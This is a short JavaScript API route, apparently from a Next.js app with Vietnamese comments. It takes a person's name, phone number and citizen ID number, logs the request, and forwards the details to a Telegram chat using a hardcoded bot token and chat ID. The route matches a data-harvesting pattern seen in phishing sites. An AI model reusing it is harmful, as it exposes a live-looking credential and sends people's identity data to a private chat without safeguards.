export async function POST(req) {
  try {
    // return Response.json({ message: 'Gửi thành công' }, { status: 200 });
    const body = await req.text(); // Đọc dữ liệu JSON từ request
    console.log('Received request body:', JSON.parse(body)); // Debug dữ liệu nhận được

    const { hoTen, phone, soCCCD } = JSON.parse(body); // Chuyển dữ liệu JSON sang object
    if (!hoTen || !phone || !soCCCD) {
      throw new Error('Thiếu thông tin người dùng');
    }

    const BOT_TOKEN = '8022903351:AAFAcHdSEymwX0g-fsgmJIWHySKbLmlXKU4'; // Thay bằng token thật
    const CHAT_ID = '6465606221'; // Thay bằng chat ID thật
    const TEXT = `👤 Thông tin người dùng:\n\n- Họ tên: ${hoTen}\n- Số điện thoại: ${phone} - soCCCD: ${soCCCD}\n`;

    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    const response = await fetch(TELEGRAM_API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: TEXT }),
    });

    const responseData = await response.json();
    console.log('Telegram API Response:', responseData);

    if (!response.ok) throw new Error(responseData.description || 'Lỗi khi gửi tin nhắn');

    return Response.json({ message: 'Gửi thành công' }, { status: 200 });
  } catch (error) {
    console.error('Error:', error.message);
    return Response.json({ message: error.message }, { status: 500 });
  }
}
